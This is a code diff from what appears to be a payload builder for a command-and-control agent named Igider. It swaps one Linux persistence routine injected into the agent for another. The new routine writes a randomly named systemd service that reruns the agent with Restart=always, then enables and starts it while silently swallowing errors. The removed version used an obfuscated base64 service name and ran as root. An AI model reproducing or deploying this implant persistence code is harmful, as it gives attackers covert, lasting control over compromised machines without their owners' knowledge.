@@ -448,38 +448,42 @@ class Igider(PayloadType):
 
                                 """)
             else:
-                command_code += r"""
-                    def create_persistence(self):
-                        try:
-                            svc_name = dec(b'<base64_encoded_obf_svc_name>') + str(random.randint(1000, 9999))
-                            try:
-                                subprocess.check_output(f"systemctl status {svc_name}", shell=True)
-                                return  
-                            except subprocess.CalledProcessError:
-                                pass 
+                command_code += f"""
+                import os, random, subprocess, sys
 
-                            service_file_path = f"/etc/systemd/system/{svc_name}.service"
-                            service_content = f"""[Unit]
-                Description=Persistence Service {svc_name}
+                def create_persistence_linux(self):
+                    try:
+                        svc_name = "svc" + str(random.randint(1000, 9999))  # randomized service name
+                        service_file = f"/etc/systemd/system/{{svc_name}}.service"
+
+                        # Check if service already exists
+                        if os.path.exists(service_file):
+                            return  
+
+                        # Create systemd service content
+                        service_content = f\"\"\"[Unit]
+                Description=Persistence Service {{svc_name}}
 
                 [Service]
-                ExecStart={sys.executable} {__file__}
+                ExecStart={{sys.executable}} {{os.path.abspath(__file__)}}
                 Restart=always
-                User=root 
 
                 [Install]
                 WantedBy=multi-user.target
+                \"\"\"
+
+                        # Write service file
+                        with open(service_file, "w") as f:
+                            f.write(service_content)
+
+                        # Enable and start service
+                        subprocess.run(["systemctl", "enable", svc_name], check=False)
+                        subprocess.run(["systemctl", "start", svc_name], check=False)
+
+                    except Exception:
+                        pass
                 """
 
-                            with open(service_file_path, 'w') as f:
-                                f.write(service_content)
-
-                            subprocess.check_output("systemctl daemon-reload", shell=True)
-                            subprocess.check_output(f"systemctl enable {svc_name}", shell=True)
-                            subprocess.check_output(f"systemctl start {svc_name}", shell=True)
-                        except Exception as e:
-                            pass
-                """
 
             
             # Step 3: Configure agent
